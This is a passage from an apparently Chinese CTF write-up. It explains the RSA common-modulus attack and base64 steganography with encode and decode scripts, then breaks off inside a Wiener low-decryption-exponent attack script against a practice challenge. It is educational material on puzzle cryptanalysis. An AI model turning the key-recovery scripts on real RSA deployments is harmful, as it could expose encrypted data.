data-num="7"></td><td><prepre></td></tr><tr><td data-num="8"></td><td><prepre></td></tr><tr><td data-num="9"></td><td><prepre></td></tr><tr><td data-num="10"></td><td><prepre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>#output2</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><prepre></td></tr><tr><td data-num="16"></td><td><pre>599</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><prepre></td></tr><tr><td data-num="19"></td><td><prepre></td></tr><tr><td data-num="20"></td><td><prepre></td></tr><tr><td data-num="21"></td><td><pre>8786437178698940322877889807009957616777351844979869726962356553244050911283984280960665761649310895230455072977431415102053987735969326553978994853162483051544656873294555116009995592043183070208706258164840540599577072097104139505857517663273929851202628854185356185647194933800084230503413037858893307713037149307477830536758283681093517617820169181420796105338681582230788318108428132051793761014952837330456262272828627355701464740578197966332613127307037255647286823496355917642353327912440019621838870388091824748629637425759125214639885130163183752378908729773517053259212525494555880921052679512582051516604297098204363525081039382358483926727008679327719083138865969291911863630382097160230960738043575559330264018212774424527719153248563876760067931499029384228993253862501939337758514377472011933279273181144830381169849387893799390755052093069179605579485710343655570028592595882436632426527654452895431758715126580164902410286422637215098476316042367916779431052267545769495994723721129943616294879642305545894912914632980455031755879087401575310699765408473606166727137934224515998416625122213056208800095077933103150699272650116151674702438463062734472714004926103668378506804002740045547964716693536349447660850580</pre></td></tr><tr><td data-num="22"></td><td><prepre></td></tr><tr><td data-num="23"></td><td><prepre></td></tr></table></figure><p>先分析一下 py 文件 e1,e2 通过 get_enc_key 输出到 output，f1,f2 的作用就是写入 N 和 e1,e2.ct1,ct2 通过模运算 pt^e1MODn==ct1 得到<br />
拥有相同的模数 N，两个不同的公钥指数 e 和不同的密文 c。这种类型就是共模，且 gcd (e1,e2)==1<br />
 又叫模不互素。共模攻击时 n 不需要分解，从而也就不需要求私钥 d。<br />
此题中 base64 = fr.read (255) 最后运算得到的是一串 base64 但是被分串了。看了 wp 说是 base64 隐写，之前接触过但没有研究一下就潦草而过了。关于 base64 隐写解码的脚本在下面一段，即本题的 payload</p>
<h3 id="base64隐写"><a class="anchor" href="#base64隐写">#</a> BASE64 隐写</h3>
<p>base64 包含的字符有<span class="label warning"> A-Za-z0-9+/</span><br />
 总共有<span class="label warning"> 26+26+10+2=64 个字符</span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/5c09c31b1ba4c32f.png" alt="" /></p>
<p>Base64 要求把每三个 8Bit 的字节转换为四个 6Bit 的字节（3x8 = 4x6 = 24），然后把 6Bit 再添两位高位 0，组成四个 8Bit 的字节，也就是说，转换后的字符串理论上将要比原来的长 1/3。我在这里做三个英文字母然后分解一下</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/98a5cd8a11b1a6aa.png" alt="" /><br />
会发现经过 base 编码后的字符从三位变成了四位；<span class="label primary">3x8 ----&gt;  4x6</span><br />
 如果给的是四个字符串呢？ 3x8=24 能够被 6 整除但是 4x8=32 不能整除 6 了；这时候我们需要补零</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/ab3acf6eebe78522.png" alt="" /></p>
<p>仅仅是补上那四位 0 是不够的，BAsDEQ 总共才 6 位数尚未满足被 4 整除的条件，要知道 'ELD' 生成的 'BAsD' 是四个字母并且刚好满足 24%4=0 的条件，所以我们必须要字符串个数满足 i%4=0 的状况</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/6a9ac6fd9acba101.png" alt="" /><br />
在后面添上两个 '==' 就可以了，解码的时候把等号去掉，转换为对应的二进制码，从左至右，8 位一组；末尾去掉多余的 0</p>
<p>说完了 base64 的构成，那么究竟什么是 base64 隐写呢？</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/4a2aee80ff51e517.png" alt="" /></p>
<p>解码时候绿色部分都会丢弃掉，所以我们无论怎样更改这里面的内容都是不会发生值的变化的，这也是可以发挥隐写的地方 <span class="label warning">但是请注意等号部分的 0 不可以用于隐写，修改其中的值会导致等号的数量发生变化，对后来的解码有质的影响</span></p>
<p>绿色部分作为字符的最后组成部分丢弃也不影响解码，还原的时候只会用到最后一个字符的前半部分，唯一会变化的就是字符会变化罢了，但是不影响解码结果</p>
<p><span class="label warning">要隐藏一个字符串我们得做好多行的 base64 才能将他们隐写，一行 base64 只能有 2 个等号</span></p>
<h4 id="encode"><a class="anchor" href="#encode">#</a> Encode</h4>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#转载自：https://www.tr0y.wang/2017/06/14/Base64steg/</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="3"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">'Tr0y&#123;Base64isF4n&#125;'</span> <span class="token comment">#flag</span></pre></td></tr><tr><td data-num="4"></td><td><pre>bin_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>base64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'0.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f0<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f1<span class="token punctuation">:</span> <span class="token comment">#'0.txt' 是明文，'1.txt' 用于存放隐写后的 base64</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f0<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        rowstr <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        equalnum <span class="token operator">=</span> rowstr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">if</span> equalnum <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span>equalnum <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            char <span class="token operator">=</span> rowstr<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>rowstr<span class="token punctuation">)</span> <span class="token operator">-</span> equalnum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            rowstr <span class="token operator">=</span> rowstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>char<span class="token punctuation">,</span> base64chars<span class="token punctuation">[</span>base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span>equalnum<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        f1<span class="token punctuation">.</span>write<span class="token punctuation">(</span>rowstr <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="decode"><a class="anchor" href="#decode">#</a> Decode</h4>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span><span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="3"></td><td><pre>c <span class="token operator">=</span> <span class="token string">b'VEhJUz==\nRkxBR3==\nSVN=\nSElEREVOLo==\nQ0FO\nWU9V\nRklORM==\nSVT=\nT1VUP4==\nRE8=\nWU9V\nS05PV9==\nQkFTRTY0P5==\nWW91bmdD\nVEhJTku=\nWU9V\nQVJF\nTk9U\nVEhBVE==\nRkFNSUxJQVI=\nV0lUSO==\nQkFTRTY0Lh==\nQmFzZTY0\naXO=\nYW==\nZ3JvdXA=\nb2b=\nc2ltaWxhcn==\nYmluYXJ5LXRvLXRleHR=\nZW5jb2Rpbme=\nc2NoZW1lc0==\ndGhhdD==\ncmVwcmVzZW50\nYmluYXJ5\nZGF0YW==\naW5=\nYW6=\nQVNDSUl=\nc3RyaW5n\nZm9ybWF0\nYnk=\ndHJhbnNsYXRpbmd=\naXS=\naW50b1==\nYT==\ncmFkaXgtNjQ=\ncmVwcmVzZW50YXRpb24u\nVGhl\ndGVybc==\nQmFzZTY0\nb3JpZ2luYXRlc8==\nZnJvbd==\nYY==\nc3BlY2lmaWN=\nTUlNRT==\nY29udGVudI==\ndHJhbnNmZXI=\nZW5jb2Rpbmcu\nVGhl\ncGFydGljdWxhct==\nc2V0\nb2b=\nNjR=\nY2hhcmFjdGVyc5==\nY2hvc2Vu\ndG+=\ncmVwcmVzZW50\ndGhl\nNjQ=\ncGxhY2UtdmFsdWVz\nZm9y\ndGhl\nYmFzZd==\ndmFyaWVz\nYmV0d2Vlbt==\naW1wbGVtZW50YXRpb25zLp==\nVGhl\nZ2VuZXJhbI==\nc3RyYXRlZ3n=\naXO=\ndG9=\nY2hvb3Nl\nNjR=\nY2hhcmFjdGVyc5==\ndGhhdA==\nYXJl\nYm90aN==\nbWVtYmVyc5==\nb2a=\nYS==\nc3Vic2V0\nY29tbW9u\ndG8=\nbW9zdM==\nZW5jb2RpbmdzLA==\nYW5k\nYWxzb8==\ncHJpbnRhYmxlLg==\nVGhpc9==\nY29tYmluYXRpb25=\nbGVhdmVz\ndGhl\nZGF0YW==\ndW5saWtlbHk=\ndG/=\nYmV=\nbW9kaWZpZWS=\naW5=\ndHJhbnNpdE==\ndGhyb3VnaN==\naW5mb3JtYXRpb26=\nc3lzdGVtcyw=\nc3VjaN==\nYXM=\nRS1tYWlsLD==\ndGhhdA==\nd2VyZQ==\ndHJhZGl0aW9uYWxseQ==\nbm90\nOC1iaXQ=\nY2xlYW4uWzFd\nRm9y\nZXhhbXBsZSw=\nTUlNRSdz\nQmFzZTY0\naW1wbGVtZW50YXRpb24=\ndXNlcw==\nQahDWiw=\nYahDeiw=\nYW5k\nMKhDOQ==\nZm9y\ndGhl\nZmlyc3Q=\nNjI=\ndmFsdWVzLg==\nT3RoZXI=\ndmFyaWF0aW9ucw==\nc2hhcmU=\ndGhpcw==\ncHJvcGVydHk=\nYnV0\nZGlmZmVy\naW4=\ndGhl\nc3ltYm9scw==\nY2hvc2Vu\nZm9y\ndGhl\nbGFzdA==\ndHdv\ndmFsdWVzOw==\nYW4=\nZXhhbXBsZQ==\naXM=\nVVRGLTcu'</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_base64_diff_value</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    base64chars <span class="token operator">=</span> <span class="token string">b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    res <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">return</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> res</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">def</span> <span class="token function">solve_stego</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    line<span class="token operator">=</span><span class="token string">b''</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    bin_str<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        k<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">if</span> k<span class="token operator">==</span><span class="token string">b'\n'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            steg_line <span class="token operator">=</span> line</pre></td></tr><tr><td data-num="20"></td><td><pre>            norm_line <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            diff <span class="token operator">=</span> get_base64_diff_value<span class="token punctuation">(</span>steg_line<span class="token punctuation">,</span> norm_line<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token comment">#print(diff)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            pads_num <span class="token operator">=</span> steg_line<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">b'='</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">if</span> diff<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                bin_str <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>pads_num <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                bin_str <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> pads_num <span class="token operator">*</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>goflag<span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            line<span class="token operator">=</span><span class="token string">b''</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        line<span class="token operator">+=</span>k</pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">def</span> <span class="token function">goflag</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    res_str <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        res_str <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> res_str</pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    solve_stego<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="低解密指数攻击"><a class="anchor" href="#低解密指数攻击">#</a> 低解密指数攻击</h2>
<p>当 e 过大时会显得 d 特别小 Wiener’s Attack 算法从 e 中快速推断出 d 的值。 网上关于维纳攻击的介绍实在太少了，要么就是天文数字看着脑壳都痛，关于这段以后在补上吧。</p>
<p>这是寒假 hgame 的一道 week3 的密码题</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> s2n</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="9"></td><td><pre>d <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>e <span class="token operator">=</span> invert<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">#n = 507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#e = 77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">#c = 165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span></pre></td></tr></table></figure><p>payload</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> ContinuedFractions<span class="token punctuation">,</span> Arithmetic<span class="token punctuation">,</span> RSAvulnerableKeyGenerator</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="6"></td><td><pre>    Finds d knowing (e,n)</pre></td></tr><tr><td data-num="7"></td><td><pre>    applying the Wiener continued fraction attack</pre></td></tr><tr><td data-num="8"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    frac <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>rational_to_contfrac<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    convergents <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>convergents_from_contfrac<span class="token punctuation">(</span>frac<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    </pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span>d<span class="token punctuation">)</span> <span class="token keyword">in</span> convergents<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        </pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#check if d is actually the key</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">if</span> k<span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            phi <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>k</pre></td></tr><tr><td data-num="17"></td><td><pre>            s <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token comment"># check if the equation x^2 - s*x + n = 0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token comment"># has integer roots</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            discr <span class="token operator">=</span> s<span class="token operator">*</span>s <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span>n</pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>discr<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                t <span class="token operator">=</span> Arithmetic<span class="token punctuation">.</span>is_perfect_square<span class="token punctuation">(</span>discr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token keyword">if</span> t<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s<span class="token operator">+</span>t<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hacked!"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                    <span class="token keyword">return</span> d</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    n <span class="token operator">=</span> <span class="token 